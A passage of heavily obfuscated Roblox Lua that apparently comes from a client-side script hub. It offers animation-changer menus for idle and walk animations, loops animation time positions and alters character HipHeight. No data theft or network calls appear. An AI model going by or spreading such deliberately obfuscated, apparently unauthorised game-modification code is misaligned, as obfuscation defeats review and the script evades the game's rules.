"\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101","\091\083\071\093\032\080\117\114\105\116\121","\091\083\071\093\032\069\117\099\108\105\100\101\097\110", "\091\083\071\093\032\069\113\117\105\110\111\120","\091\083\071\093\032\067\114\097\122\101\100","\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107", "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116", } _IlIlIlllII = _lllllIllll[math.random(0x1, #_lllllIllll)] end
 _IIIIllllII = _IlIlIlllII local _llIIlIIlll = _IlIllIIllI.IdleAnimationStartFadeTime and _IlIllIIllI.IdleAnimationStartFadeTime.Value or 0.1 if _IlIlIlllII == "\091\068\069\070\093\032\087\097\116\099\104" then _IlIlIllllI = _IIlIIIllll("\049\056\056\057\055\055\051\051\051\049\050") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) elseif _IlIlIlllII == "\091\068\069\070\093\032\067\097\115\117\097\108" then _IlIlIllllI = _IIlIIIllll("\049\051\055\051\054\049\049\053\048\048\057") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _lllIllllIl = _IIlIIIllll("\049\056\050\053\051\053\055\048\052\051\052") if _lllIllllIl then _lllIllllIl.Priority = Enum.AnimationPriority.Idle _lllIllllIl:Play(_llIIlIIlll) _lllIllllIl:AdjustSpeed(0x0) _lllIllllIl.TimePosition = 0.3 end
 elseif _IlIlIlllII == "\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116" then _IlIlIllllI = _IIlIIIllll("\049\056\052\053\048\052\048\054\057\049\055") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlllIlIlII = TweenService:Create(_IlIlIllllI, TweenInfo.new(0x1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0.1}) _IlllIlIlII:Play() elseif _IlIlIlllII == "\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114" then _IlIlIllllI = _IIlIIIllll("\049\055\048\056\054\051\051\051\053\054\051") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI.TimePosition = 1.5 _IlllIlIlII = TweenService:Create(_IlIlIllllI, TweenInfo.new(0x3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0x2}) _IlllIlIlII:Play() elseif _IlIlIlllII == "\091\068\069\070\093\032\070\108\121\032\073\100\108\101" then _IlIlIllllI = _IIlIIIllll("\049\055\049\050\052\048\054\049\054\054\051") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) elseif _IlIlIlllII == "\091\083\071\093\032\077\097\121\104\101\109" then _IlIlIllllI = _IIlIIIllll("\049\055\048\057\055\055\049\050\051\056\055") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(.0x1) _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = .0x5+math.cos(_lIlllIlIll/0x23)/0xF task.wait(.0x2) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\085\108\116\114\097\115\111\110\105\099" then _IlIlIllllI = _IIlIIIllll("\049\055\049\048\054\049\054\057\054\054\053") _IllIIlIIlI = _IIlIIIllll("\051\049\051\055\054\050\054\051\048") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Action4 _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI:AdjustWeight(1e8) if _IllIIlIIlI then _IllIIlIIlI.Priority = Enum.AnimationPriority.Action4 _IllIIlIIlI:Play(_llIIlIIlll) _IllIIlIIlI:AdjustWeight(1e8) end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = 1.2+math.sin(_lIlllIlIll/0xF)/0x23 local _IlIIIIlIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIIlIIl then _IlIIIIlIIl.HipHeight = 0x2+math.sin(_lIlllIlIll/0xF)*0x2 end
 task.wait(.0x2) end
 local _IlIIIIlIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIIlIIl then _IlIIIIlIIl.HipHeight = 0x0 end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\082\097\105\110\098\111\119" then _IlIlIllllI = _IIlIIIllll("\049\056\052\054\052\051\055\050\056\053\048") _IlIIIlIllI = _IIlIIIllll("\049\052\051\053\055\057\052\051\052\056\055") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) if _IlIIIlIllI then _IlIIIlIllI.Priority = Enum.AnimationPriority.Movement _IlIIIlIllI:Play(_llIIlIIlll) _IlIIIlIllI:AdjustSpeed(0x0) end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then return end
 _IlIlIllllI.TimePosition = 2.75+math.cos(_lIlllIlIll/0x23)/0x2D task.wait(.0x5) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\090\121\108\101\100\111\110" then _lllIllllIl = _IIlIIIllll("\049\053\057\053\055\051\055\054\055\050\050") _IlIlIllllI = _IIlIIIllll("\055\050\048\052\050\048\050\052") if not _lllIllllIl then _lIllIllIlI = false return end
 _lllIllllIl.Priority = Enum.AnimationPriority.Idle _lllIllllIl:Play(_llIIlIIlll) _lllIllllIl:AdjustSpeed(0x0) _lllIllllIl.Looped = true if _IlIlIllllI then _IlIlIllllI.Priority = Enum.AnimationPriority.Movement _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI.TimePosition = .0x1 _IlIlIllllI.Looped = true end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0x3B2E do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _lllIllllIl.TimePosition = 3.2+math.cos(_lIlllIlIll/0x19)/0xFF task.wait(.0x1) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101" then _IlIlIllllI = _IIlIIIllll("\049\050\057\050\057\053\049\053\054\051\051\054\054\055\053") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then return end
 _IlIlIllllI.TimePosition = .0x5+math.cos(_lIlllIlIll/0xF)/0x23 task.wait(.0x5) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\080\117\114\105\116\121" then _IlIlIllllI = _IIlIIIllll("\049\055\049\050\049\054\057\053\051\050\057") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x1) elseif _IlIlIlllII == "\091\083\071\093\032\069\117\099\108\105\100\101\097\110" then _IlIlIllllI = _IIlIIIllll("\049\052\053\050\055\050\050\057\053\049\048") _lllIllllIl = _IIlIIIllll("\057\057\050\055\055\056\056\053\051\050\053\051\055\052") _IlIIIIlIIl = _IIlIIIllll("\049\053\049\052\054\051\052\056\055\051\056") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI.Looped = true if _lllIllllIl then _lllIllllIl.Priority = Enum.AnimationPriority.Idle _lllIllllIl:Play(_llIIlIIlll) _lllIllllIl:AdjustSpeed(.0x8) _lllIllllIl.Looped = true end
 if _IlIIIIlIIl then _IlIIIIlIIl.Priority = Enum.AnimationPriority.Movement _IlIIIIlIIl:Play(_llIIlIIlll) _IlIIIIlIIl:AdjustSpeed(.0x1) _IlIIIIlIIl.Looped = true end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0x3B2E do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = .0x9+math.cos(_lIlllIlIll/0xF)/0x9B task.wait(.0x1) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\069\113\117\105\110\111\120" then _IlIlIllllI = _IIlIIIllll("\049\053\053\048\051\048\054\048\050\051\050") _IlIIIlIllI = _IIlIIIllll("\056\056\048\049\054\057\053\053") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) if _IlIIIlIllI then _IlIIIlIllI.Priority = Enum.AnimationPriority.Idle _IlIIIlIllI:Play(_llIIlIIlll) _IlIIIlIllI:AdjustSpeed(0x0) end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = 4.8+math.cos(_lIlllIlIll/0x5)/0xA task.wait(.0x1) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\067\114\097\122\101\100" then _IlIlIllllI = _IIlIIIllll("\055\053\051\049\056\050\050\056\052\048\055\052\050\050") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(.0x1) _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII local _IIlIIllIlI = _IlIlIllllI task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 if not _IIlIIllIlI or not _IIlIIllIlI.IsPlaying then break end
 local _llllllIllI = math.random(0x1,0xF) if _llllllIllI == 0xF then for _lllIlllIIl = 0x1,math.random(0x2,0x7) do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 if not _IIlIIllIlI or not _IIlIIllIlI.IsPlaying then break end
 _IIlIIllIlI.TimePosition = .0x7 + math.random(-0xF,0xF)/0x37 task.wait(.0x1) end
 end
 if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IIlIIllIlI.TimePosition = .0x7 + math.cos(_lIlllIlIll/0x23)/0x7 task.wait(.0x2) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107" then _IlIlIllllI = _IIlIIIllll("\049\053\048\049\056\050\049\057\054\057\050") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(.0x1) _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = .0x4+math.cos(_lIlllIlIll/0x23)/0xF task.wait(.0x2) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116" then _IlIlIllllI = _IIlIIIllll("\049\054\055\049\057\049\048\055\048\053\048") _IlIIIlIllI = _IIlIIIllll("\049\053\049\052\054\051\052\056\055\051\056") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) if _IlIIIlIllI then _IlIIIlIllI.Priority = Enum.AnimationPriority.Idle _IlIIIlIllI:Play(_llIIlIIlll) _IlIIIlIllI:AdjustSpeed(0x0) end
 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0xF423F do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = 2.5+math.cos(_lIlllIlIll/0xF)/0xF task.wait(.0x2) end
 end
 ) elseif _IlIlIlllII == "\091\083\071\093\032\068\105\118\105\110\105\116\121" then _IlIlIllllI = _IIlIIIllll("\049\055\052\054\052\054\052\052\049\056\050") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Action4 _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI:AdjustWeight(1e8) _IlIlIllllI.Looped = true _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () for _lIlllIlIll = 0x1,0x3B2E do if not _lIIlIlIllI or _lllIllIIII ~= _IIIIlIllll then break end
 _IlIlIllllI.TimePosition = .0x3+math.cos(_lIlllIlIll/0x5)/0x2D task.wait(.0x1) end
 end
 ) elseif _IlIlIlllII == "\091\068\069\070\093\032\065\117\114\097" then _IlIlIllllI = _IIlIIIllll("\049\048\052\056\054\050\055\053\048\050\054\055\057\054\055") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI.Looped = true _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0.6) elseif _IlIlIlllII == "\091\068\069\070\093\032\083\101\114\105\111\117\115" then _IlIlIllllI = _IIlIIIllll("\049\052\048\049\054\052\054\052\050\048\052\055\049\056\056") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI.Looped = true _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI.TimePosition = 0x1 _IlIlIllllI:AdjustSpeed(0x0) _IlllIlIlII = TweenService:Create(_IlIlIllllI, TweenInfo.new(0x4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 1.1}) _IlllIlIlII:Play() elseif _IlIlIlllII == "\091\068\069\070\093\032\082\101\119\111\114\107" then _IlIlIllllI = _IIlIIIllll("\049\053\057\054\051\054\048\050\051\054\055") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI.TimePosition = 0x0 _IlllIlIlII = TweenService:Create(_IlIlIllllI, TweenInfo.new(1.7 / 0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 1.7}) _IlllIlIlII:Play() elseif _IlIlIlllII == "\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103" then _IlIlIllllI = _IIlIIIllll("\056\055\048\054\048\050\057\056\050\048\056\050\056\052") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI.Looped = true _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x1) elseif _IlIlIlllII == "\091\068\069\070\093\032\068\105\118\105\110\101" then _IlIlIllllI = _IIlIIIllll("\049\049\054\049\056\055\053\048\051\052\053\049\057\057\057") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI.Looped = false _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x0) _IlIlIllllI.TimePosition = 10.10 _IlllIlIlII = TweenService:Create(_IlIlIllllI, TweenInfo.new((13.67 - 10.10) / 0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -0x1, true, 0x0), {TimePosition = 13.67}) _IlllIlIlII:Play() elseif _IlIlIlllII == "\091\068\069\070\093\032\071\111\100" then _IlIlIllllI = _IIlIIIllll("\055\050\052\054\048\054\054\048\048\049\053\048\057\053") if not _IlIlIllllI then _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 _IlIlIllllI.Priority = Enum.AnimationPriority.Idle _IlIlIllllI.Looped = false _IlIlIllllI:Play(_llIIlIIlll) _IlIlIllllI:AdjustSpeed(0x1) _IlIlIllllI.TimePosition = 3.35 _lIIlIlIllI = true local _IIIIlIllll = _lllIllIIII task.spawn( function () while _lIIlIlIllI and _lllIllIIII == _IIIIlIllll do if _IlIlIllllI.TimePosition >= 4.6 then _IlIlIllllI:AdjustSpeed(0.2) local _lIllllIIll = true while _lIIlIlIllI and _lllIllIIII == _IIIIlIllll do local _IIlIIIlIll = _IlIlIllllI.TimePosition if _lIllllIIll then if _IIlIIIlIll >= 4.9 then _lIllllIIll = false _IlIlIllllI:AdjustSpeed(-0.2) end
 else if _IIlIIIlIll <= 4.6 then _lIllllIIll = true _IlIlIllllI:AdjustSpeed(0.2) end
 end
 task.wait() end
 break end
 task.wait() end
 end
 ) end
 _lIllIllIlI = false task.defer(_lIlIIIlllI) end
 _IIlIIlIIII = RunService.Heartbeat:Connect( function () if _lIllIllIlI then return end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then if _lllllIlllI ~= "" then _IIllIlIlIl(false) _lllllIlllI = "" _IIIIllllII = "" end
 return end
 local _llllIIIlIl = _IlIllIIllI.IdleAnimation and _IlIllIIllI.IdleAnimation.Value or "\078\111\114\109\097\108" local _IllIlIlIll = _IlIllIIllI.WalkAnimation and _IlIllIIllI.WalkAnimation.Value or "\078\111\114\109\097\108" if _llllIIIlIl == "\078\111\114\109\097\108" or _IlIIIlIIII.MoveDirection ~= Vector3.new() then if _llllIIIlIl == "\078\111\114\109\097\108" and _IlIIIlIIII.MoveDirection ~= Vector3.new() then return end
 if _lllllIlllI ~= "" then _IIllIlIlIl(false) _lllllIlllI = "" _IIIIllllII = "" _lIlIIIlllI() end
 return end
 local _IlIIlIlllI = (_llllIIIlIl ~= _lllllIlllI) if not _IlIIlIlllI then if _IlIlIllllI and _IlIlIllllI.IsPlaying then return end
 if _lllIllllIl and _lllIllllIl.IsPlaying then return end
 end
 local _IIIIlllIIl = (_lllllIlllI ~= "") _lllllIlllI = _llllIIIlIl task.spawn(_IlIllIlIII, _llllIIIlIl, _IIIIlllIIl) end
 ) table.insert(_llIlllIlIl, function () if _IIlIIlIIII then _IIlIIlIIII:Disconnect() _IIlIIlIIII = nil end
 _lIllIllIlI = false _lllllIlllI = "" _IIIIllllII = "" _IIllIlIlIl(true) _IlIIllllII() pcall( function () _IIlIlIIlIl.SGVFXToggle:SetValue(false) end
 ) pcall( function () _IlIllIIllI.IdleAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) _IIlllIlIll:AddDivider() local _lIlIlllIIl = { ["\071\111\106\111\032\082\117\110"] = "\049\056\056\057\055\049\049\053\055\056\053", ["\071\105\114\108\121\032\087\097\108\107"] = "\049\055\056\054\049\056\054\050\055\056\055", ["\083\116\101\118\101\032\087\097\108\107"] = "\049\055\056\054\049\056\055\050\053\049\057", ["\083\097\115\115\121\032\087\097\108\107"] = "\049\055\056\054\049\056\057\051\048\057\052", ["\089\097\110\100\101\114\101\032\087\097\108\107"] = "\049\055\048\056\054\048\053\052\057\057\052", ["\083\119\111\114\100\032\087\097\108\107"] = "\049\055\049\050\048\054\051\053\057\050\054", ["\077\097\114\099\104"] = "\049\053\057\054\050\052\052\051\054\053\050", ["\072\117\110\116\101\114"] = "\049\053\057\054\050\051\050\054\053\057\051", ["\071\111\111\102\121"] = "\049\056\056\057\055\054\054\052\050\057\057", ["\079\102\102\105\099\101\114\032\069\097\114\108"] = "\049\056\056\057\055\055\048\048\050\051\054", ["\075\097\122\111\116\115\107\121\032\075\105\099\107"] = "\049\055\056\054\049\056\055\048\057\057\054", ["\073\110\032\067\104\097\114\103\101"] = "\049\051\050\049\051\050\056\052\056\048\057\057\049\048\051", } _IIlllIlIll:AddDropdown("\087\097\108\107\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\114\109\097\108","\071\111\106\111\032\082\117\110","\071\105\114\108\121\032\087\097\108\107","\083\116\101\118\101\032\087\097\108\107","\083\097\115\115\121\032\087\097\108\107","\089\097\110\100\101\114\101\032\087\097\108\107","\083\119\111\114\100\032\087\097\108\107","\077\097\114\099\104","\072\117\110\116\101\114","\071\111\111\102\121","\079\102\102\105\099\101\114\032\069\097\114\108","\075\097\122\111\116\115\107\121\032\075\105\099\107","\073\110\032\067\104\097\114\103\101","\070\108\121\105\110\103" }, Default = 0x1, Multi = false, Text = "\087\097\108\107\032\065\110\105\109\097\116\105\111\110", Searchable = true, }) _IIlllIlIll:AddSlider("\087\097\108\107\065\110\105\109\083\112\101\101\100", { Text = "\087\097\108\107\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.25, Max = 0x3, Rounding = 0x1, }) _IIlllIlIll:AddDropdown("\076\111\111\112\101\100\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\110\101", "\083\112\105\110", "\067\114\097\122\121" }, Default = 0x1, Multi = false, Text = "\076\111\111\112\101\100\032\065\110\105\109\097\116\105\111\110", }) _IIlllIlIll:AddSlider("\076\111\111\112\101\100\065\110\105\109\097\116\105\111\110\083\112\101\101\100", { Text = "\076\111\111\112\101\100\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.1, Max = 0xA, Rounding = 0x1, }) local _IlllIIIlII = nil local _llllIIllIl = nil local _IIIllIIIlI = "" local _IIllIllllI = { Forward = "\049\055\049\050\052\048\054\051\056\050\054", Back = "\049\055\049\050\052\048\054\055\054\051\053", Left = "\049\055\049\050\052\049\048\053\050\057\052", Right = "\049\055\049\050\052\049\049\050\053\052\055", } local _IIlllllllI = {} _IlIllIIllI.WalkAnimSpeed:OnChanged( function (V) if _llllIIllIl then pcall( function () _llllIIllIl:AdjustSpeed(V) end
 ) end
 for _lllIlllIIl, _llIIllIlIl in pairs(_IIlllllllI) do if _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:AdjustSpeed(V) end
 ) end
 end
 end
 ) local function _lIlIIlIIll() for _lllIlllIIl, _IIlIIllIIl in pairs(_IIlllllllI) do pcall( function () if _IIlIIllIIl.IsPlaying then _IIlIIllIIl:Stop(0x0) end
 end
 ) pcall( function () _IIlIIllIIl:Destroy() end
 ) end
 _IIlllllllI = {} end
 local function _lIllIIIlll(_IIIlIllIIl) for _IlIIIIIlll, _llIIllIlIl in pairs(_IIlllllllI) do local _IlllIlIIIl = false if _IIIlIllIIl then for _lllIlllIIl, _llllIIllll in ipairs(_IIIlIllIIl) do if _llllIIllll == _IlIIIIIlll then _IlllIlIIIl = true break end
 end
 end
 if _IlllIlIIIl then if not _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:Play(0.1) end
 ) end
 else if _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:Stop(0.1) end
 ) end
 end
 end
 end
 local function _lIIllIlIll() _lIlIIlIIll() local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIllllll = _IlIIIIlIIl and _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIllllll then return end
 for _IlIIIIIlll, _IIIIllIIlI in pairs(_IIllIllllI) do local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIllIIlI local _IIlIIllIIl = _IIIIllllll:LoadAnimation(_llllIlIllI) _IIlIIllIIl.Priority = Enum.AnimationPriority.Movement _IIlIIllIIl.Looped = true _IIlllllllI[_IlIIIIIlll] = _IIlIIllIIl end
 end
 local _llIIIIIIII = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _IIlIlIlllI = nil local function _lIllIIllIl() if _IIlIlIlllI then _IIlIlIlllI:Cancel() _IIlIlIlllI = nil end
 if _llllIIllIl then pcall( function () _llllIIllIl:Stop(0.1) end
 ) _llllIIllIl = nil _IIIllIIIlI = "" end
 _lIlIIlIIll() end
 local function _lIlIIIIlll(_IIIIllIIlI) _lIllIIllIl() local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIllllll = _IlIIIIlIIl and _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIllllll then return end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIllIIlI local _IIlIIllIIl = _IIIIllllll:LoadAnimation(_llllIlIllI) if _llIIIlIIll.Character ~= _IIIlIlllll then pcall( function () _IIlIIllIIl:Destroy() end
 ) return end
 _IIlIIllIIl.Priority = Enum.AnimationPriority.Movement _IIlIIllIIl.Looped = true _llllIIllIl = _IIlIIllIIl _IIIllIIIlI = _IIIIllIIlI end
 local _IlIIlIIlII = nil local function _IlIllllllI(_IlIIlIIlIl) if _IlIIlIIlII then _IlIIlIIlII:Disconnect() _IlIIlIIlII = nil end
 if not _IlIIlIIlIl then return end
 _IlIIlIIlII = _IlIIlIIlIl.AnimationPlayed:Connect( function (_llIIllIlIl) local _llllIIIlIl = _IlIllIIllI.WalkAnimation and _IlIllIIllI.WalkAnimation.Value or "\078\111\114\109\097\108" local _llIllIlIII = _IlIIlIllIl and _IlIIlIllIl.Flying local _IlllIIlIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId:match("\037\100\043") or "" if _llllIIIlIl == "\078\111\114\109\097\108" and not _llIllIlIII then return end
 if _IlllIIlIII == "\055\056\049\053\054\049\056\049\055\053" then local _lllIIIIIlI = _llIIIlIIll.Character local _lllllIlIlI = _lllIIIIIlI and _lllIIIIIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lllllIlIlI and _lllllIlIlI.MoveDirection ~= Vector3.new() then _llIIllIlIl:Stop() end
 end
 end
 ) end
 do local _IlIIIIlIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _IlIllllllI(_IlIIIIlIIl) end
 local _IllIIIIllI = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) if _llllIIllIl then pcall( function () _llllIIllIl:Stop(0x0) end
 ) end
 _llllIIllIl = nil _IIIllIIIlI = "" task.spawn( function () local _IlIIIIlIIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if not _IlIIIIlIIl then return end
 local _IIIIllllll = _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _IlIIIIlIIl:WaitForChild("\065\110\105\109\097\116\111\114", 0x5) if not _IIIIllllll then return end
 if not _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") then _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x5) end
